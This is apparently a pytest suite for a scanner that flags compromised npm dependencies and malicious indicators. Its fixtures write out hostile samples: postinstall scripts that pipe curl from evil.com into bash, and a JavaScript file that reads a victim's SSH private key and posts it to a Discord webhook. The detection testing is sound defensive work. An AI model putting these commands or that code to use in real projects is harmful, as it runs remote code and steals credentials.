import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from scripts import scan  # noqa: E402


def test_scan_reports_compromised_dependency(tmp_path):
    project_dir = tmp_path / "project"
    project_dir.mkdir()
    (project_dir / "package.json").write_text(
        json.dumps({"dependencies": {"left-pad": "1.0.0"}}),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "left-pad", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--log-level",
            "INFO",
        ]
    )

    assert exit_code == 1

    log_files = sorted(log_dir.glob("shai_hulud_scan_*.log"))
    assert log_files, "expected scan log to be written"
    log_text = log_files[-1].read_text(encoding="utf-8")

    assert "Detected compromised dependencies" in log_text
    assert "left-pad@1.0.0" in log_text
    assert "Total findings: 1" in log_text


def test_structured_format_output(tmp_path, capsys):
    """Test structured format displays multi-section report."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()
    (project_dir / "package.json").write_text(
        json.dumps({"dependencies": {"left-pad": "1.0.0"}}),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "left-pad", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "structured",
            "--no-color",
            "--no-emoji",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Check for structured report sections
    assert "SHAI-HULUD AUDIT REPORT" in captured.out
    assert "SCAN SCOPE" in captured.out
    assert "COVERAGE" in captured.out
    assert "FINDINGS" in captured.out
    assert "DETAILED FINDINGS" in captured.out
    assert "RECOMMENDATIONS" in captured.out
    assert "Manifests scanned:" in captured.out
    assert "left-pad@1.0.0" in captured.out


def test_compact_format_output(tmp_path, capsys):
    """Test compact format displays legacy report."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()
    (project_dir / "package.json").write_text(
        json.dumps({"dependencies": {"left-pad": "1.0.0"}}),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "left-pad", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "compact",
            "--no-color",
            "--no-emoji",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Compact format should NOT have structured sections
    assert "SHAI-HULUD AUDIT REPORT" not in captured.out
    assert "SCAN SCOPE" not in captured.out


def test_json_format_output(tmp_path, capsys):
    """Test JSON format outputs parseable JSON."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()
    (project_dir / "package.json").write_text(
        json.dumps({"dependencies": {"left-pad": "1.0.0"}}),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "left-pad", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "json",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Parse JSON output
    findings = json.loads(captured.out)
    assert isinstance(findings, list)
    assert len(findings) == 1
    assert findings[0]["package"] == "left-pad"
    assert findings[0]["version"] == "1.0.0"


def test_json_flag_alias(tmp_path, capsys):
    """Test --json flag works as alias for --format json."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()
    (project_dir / "package.json").write_text(
        json.dumps({"dependencies": {"left-pad": "1.0.0"}}),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "left-pad", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--json",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Should output JSON
    findings = json.loads(captured.out)
    assert isinstance(findings, list)


def test_clean_scan_structured_format(tmp_path, capsys):
    """Test structured format with no findings shows clean message."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()
    (project_dir / "package.json").write_text(
        json.dumps({"dependencies": {"lodash": "4.17.21"}}),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "left-pad", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "structured",
            "--no-color",
            "--no-emoji",
        ]
    )

    assert exit_code == 0
    captured = capsys.readouterr()

    # Check for clean message in structured format
    assert "SHAI-HULUD AUDIT REPORT" in captured.out
    assert "No compromised packages or IOCs detected" in captured.out
    assert "RECOMMENDATIONS" not in captured.out  # No recommendations when clean


def test_script_ioc_detection(tmp_path, capsys):
    """Test detection of suspicious script IOCs in package.json."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json with suspicious script
    (project_dir / "package.json").write_text(
        json.dumps({
            "name": "test-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl https://evil.com/steal.sh | bash",
                "test": "jest"
            }
        }),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "structured",
            "--no-color",
            "--no-emoji",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Check for script IOC detection
    assert "Script IOCs" in captured.out
    assert "postinstall" in captured.out
    assert "curl https://evil.com/steal.sh" in captured.out


def test_workflow_ioc_detection(tmp_path, capsys):
    """Test detection of suspicious workflow IOCs."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create .github/workflows directory with suspicious workflow
    workflows_dir = project_dir / ".github" / "workflows"
    workflows_dir.mkdir(parents=True)
    workflow_content = (
        "name: Shai-Hulud Malicious Workflow\non: [push]\njobs:\n  steal:\n"
        "    runs-on: ubuntu-latest\n    steps:\n      - run: echo 'evil'"
    )
    (workflows_dir / "shai-hulud-workflow.yml").write_text(workflow_content, encoding="utf-8")

    # Create clean package.json
    (project_dir / "package.json").write_text(
        json.dumps({"name": "test-package", "version": "1.0.0"}),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "structured",
            "--no-color",
            "--no-emoji",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Check for workflow IOC detection
    assert "Workflow IOCs" in captured.out
    assert "shai-hulud-workflow.yml" in captured.out


def test_no_detect_iocs_flag(tmp_path, capsys):
    """Test --no-detect-iocs flag disables script and workflow IOC detection."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json with suspicious script
    (project_dir / "package.json").write_text(
        json.dumps({
            "name": "test-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "wget https://evil.com/malware.sh"
            }
        }),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "structured",
            "--no-color",
            "--no-emoji",
            "--no-detect-iocs",
        ]
    )

    assert exit_code == 0  # Should be clean since IOC detection is disabled
    captured = capsys.readouterr()

    # Should not detect IOCs
    assert "Script IOCs" not in captured.out
    assert "No compromised packages or IOCs detected" in captured.out


def test_pattern_detection(tmp_path, capsys):
    """Test detection of suspicious code patterns in JavaScript files."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json
    (project_dir / "package.json").write_text(
        json.dumps({"name": "test-package", "version": "1.0.0"}),
        encoding="utf-8",
    )

    # Create JavaScript file with suspicious patterns
    (project_dir / "index.js").write_text(
        """
        const child_process = require('child_process');
        child_process.exec('curl https://evil.com');
        eval(userInput);
        const secret = process.env['API_SECRET'];
        """,
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "structured",
            "--no-color",
            "--no-emoji",
            "--detect-patterns",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Check for pattern detection
    assert "Suspicious Code Patterns" in captured.out or "Suspicious Patterns" in captured.out
    assert "child_process" in captured.out or "eval_usage" in captured.out


def test_pattern_severity_filter(tmp_path, capsys):
    """Test pattern severity filtering."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json
    (project_dir / "package.json").write_text(
        json.dumps({"name": "test-package", "version": "1.0.0"}),
        encoding="utf-8",
    )

    # Create JavaScript file with low and high severity patterns
    (project_dir / "index.js").write_text(
        """
        const fs = require('fs');  // low severity
        eval(userInput);  // high severity
        """,
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    # Scan with high severity filter - should only detect eval_usage
    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "json",
            "--detect-patterns",
            "--pattern-severity",
            "high",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Parse JSON output
    findings = json.loads(captured.out)
    pattern_findings = [f for f in findings if f.get("category") == "suspicious_pattern"]

    # Should only have high severity patterns
    assert len(pattern_findings) > 0
    for finding in pattern_findings:
        assert finding["severity"] in ["high", "critical"]


def test_exfiltration_detection_critical(tmp_path, capsys):
    """Test detection of critical exfiltration patterns (credential access + network call)."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json
    (project_dir / "package.json").write_text(
        json.dumps({"name": "test-package", "version": "1.0.0"}),
        encoding="utf-8",
    )

    # Create JavaScript file with critical exfiltration pattern
    (project_dir / "malicious.js").write_text(
        """
        const fs = require('fs');
        const https = require('https');

        // Read SSH keys
        const sshKey = fs.readFileSync('/Users/victim/.ssh/id_rsa', 'utf8');

        // Send to Discord webhook
        https.request('https://discord.com/api/webhooks/123/abc', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, (res) => {
            console.log('Data sent');
        }).end(JSON.stringify({ content: sshKey }));
        """,
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "structured",
            "--no-color",
            "--no-emoji",
            "--detect-exfiltration",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Check for exfiltration detection
    assert "Data Exfiltration Risks" in captured.out or "exfiltration" in captured.out.lower()
    assert "critical" in captured.out.lower()


def test_exfiltration_detection_webhook(tmp_path, capsys):
    """Test detection of webhook endpoints (high severity)."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json
    (project_dir / "package.json").write_text(
        json.dumps({"name": "test-package", "version": "1.0.0"}),
        encoding="utf-8",
    )

    # Create JavaScript file with webhook endpoint
    (project_dir / "webhook.js").write_text(
        """
        fetch('https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX', {
            method: 'POST',
            body: JSON.stringify({ text: 'Hello from script' })
        });
        """,
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "json",
            "--detect-exfiltration",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Parse JSON output
    findings = json.loads(captured.out)
    exfil_findings = [f for f in findings if f.get("category") == "exfiltration"]

    # Should detect webhook
    assert len(exfil_findings) > 0
    assert any("webhook" in f.get("evidence", "").lower() for f in exfil_findings)
    assert any(f.get("severity") == "high" for f in exfil_findings)


def test_exfiltration_allowlist(tmp_path, capsys):
    """Test that allowlist filters out false positives."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json
    (project_dir / "package.json").write_text(
        json.dumps({"name": "test-package", "version": "1.0.0"}),
        encoding="utf-8",
    )

    # Create JavaScript file with ngrok (commonly used legitimately in dev)
    (project_dir / "dev-server.js").write_text(
        """
        const ngrok = require('ngrok');
        (async function() {
            const url = await ngrok.connect(8080);
            console.log('Tunnel URL:', url);
        })();
        """,
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "json",
            "--detect-exfiltration",
            "--exfiltration-allowlist",
            "ngrok.io",
        ]
    )

    captured = capsys.readouterr()

    # Parse JSON output
    findings = json.loads(captured.out)
    exfil_findings = [f for f in findings if f.get("category") == "exfiltration"]

    # Should not detect ngrok since it's allowlisted
    assert len(exfil_findings) == 0


def test_namespace_warnings(tmp_path, capsys):
    """Test detection of packages from compromised namespaces."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json with package from compromised namespace
    (project_dir / "package.json").write_text(
        json.dumps({
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "@malicious-scope/some-package": "1.0.0"
            }
        }),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    # Advisory contains @malicious-scope/other-package, not some-package
    advisory.write_text(
        json.dumps({
            "items": [
                {"package": "@malicious-scope/other-package", "version": "1.0.0"}
            ]
        }),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    exit_code = scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "json",
        ]
    )

    assert exit_code == 1
    captured = capsys.readouterr()

    # Parse JSON output
    findings = json.loads(captured.out)
    namespace_findings = [f for f in findings if f.get("category") == "namespace_warning"]

    # Should warn about @malicious-scope namespace
    assert len(namespace_findings) == 1
    assert namespace_findings[0]["package"] == "@malicious-scope/some-package"
    assert "Namespace @malicious-scope is compromised" in namespace_findings[0]["evidence"]


def test_no_namespace_warnings_flag(tmp_path, capsys):
    """Test that --no-warn-namespaces suppresses warnings."""
    project_dir = tmp_path / "project"
    project_dir.mkdir()

    # Create package.json with package from compromised namespace
    (project_dir / "package.json").write_text(
        json.dumps({
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "@malicious-scope/some-package": "1.0.0"
            }
        }),
        encoding="utf-8",
    )

    advisory = tmp_path / "advisory.json"
    advisory.write_text(
        json.dumps({
            "items": [
                {"package": "@malicious-scope/other-package", "version": "1.0.0"}
            ]
        }),
        encoding="utf-8",
    )

    log_dir = tmp_path / "logs"

    scan.run(
        [
            str(project_dir),
            "--advisory-file",
            str(advisory),
            "--log-dir",
            str(log_dir),
            "--format",
            "json",
            "--no-warn-namespaces",
        ]
    )

    captured = capsys.readouterr()

    # Parse JSON output
    findings = json.loads(captured.out)
    namespace_findings = [f for f in findings if f.get("category") == "namespace_warning"]

    # Should not warn when flag is disabled
    assert len(namespace_findings) == 0
